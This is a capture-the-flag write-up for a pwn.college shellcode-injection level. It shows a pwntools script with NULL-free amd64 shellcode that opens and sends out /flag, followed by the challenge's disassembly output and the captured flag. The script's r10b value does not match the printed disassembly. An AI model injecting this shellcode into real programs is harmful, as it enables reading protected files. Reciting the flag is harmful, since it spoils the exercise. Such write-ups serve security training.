# Level 3

## Approach

This time the challenge requires that the shellcode should have no NULL bytes!

I came across this useful article : https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/

Here I found two interesting methods - 1- Shifting to Lose Nullbytes & 2- XOR to evade Nullbytes

Equipped with this info, this is the script I came up with to solve this challenge :-

```py 
from pwn import *

p = process("/challenge/babyshell-level-3")
context.arch = 'amd64'

script = asm(f'''

mov rbx, 0x67616c662f2f2f2f   # "////flag" in little endian
shr rbx, 0x18                 # Shift right(0x18 = 24) to get "/flag" by removing "///"
push rbx

xor rax, rax                  # XOR rax by rax gives 0 and removes any nullbytes
mov al, 2                     # Similar logic as previous levels from here
xor rsi, rsi
mov rdi, rsp
syscall

xor rdi, rdi
mov dil, 1
mov rsi, rax
xor rdx, rdx
mov al, 40
mov r10b, 255
syscall

xor rax, rax
mov al, 60
syscall
''')


p.sendline(script)
p.interactive()
```

From this I got the flag 

```
hacker@shellcode-injection~level3:~$ python3 script4.py
[+] Starting local process '/challenge/babyshell-level-3': pid 126
[*] Switching to interactive mode
###
### Welcome to /challenge/babyshell-level-3!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22920000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no NULL bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000022920000 | 48 bb 2f 2f 2f 2f 66 6c 61 67                 | movabs rbx, 0x67616c662f2f2f2f
0x000000002292000a | 48 c1 eb 18                                   | shr rbx, 0x18
0x000000002292000e | 53                                            | push rbx
0x000000002292000f | 48 31 c0                                      | xor rax, rax
0x0000000022920012 | b0 02                                         | mov al, 2
0x0000000022920014 | 48 31 f6                                      | xor rsi, rsi
0x0000000022920017 | 48 89 e7                                      | mov rdi, rsp
0x000000002292001a | 0f 05                                         | syscall
0x000000002292001c | 48 31 ff                                      | xor rdi, rdi
0x000000002292001f | 40 b7 01                                      | mov dil, 1
0x0000000022920022 | 48 89 c6                                      | mov rsi, rax
0x0000000022920025 | 48 31 d2                                      | xor rdx, rdx
0x0000000022920028 | b0 28                                         | mov al, 0x28
0x000000002292002a | 41 b2 e6                                      | mov r10b, 0xe6
0x000000002292002d | 0f 05                                         | syscall
0x000000002292002f | 48 31 c0                                      | xor rax, rax
0x0000000022920032 | b0 3c                                         | mov al, 0x3c
0x0000000022920034 | 0f 05                                         | syscall

Executing shellcode!

pwn.college{kGM9pzwyXepwzvgLKM26OTBjVay.0VOxIDLzITO0czW}
```

## Flag
`pwn.college{kGM9pzwyXepwzvgLKM26OTBjVay.0VOxIDLzITO0czW}`

## References
https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/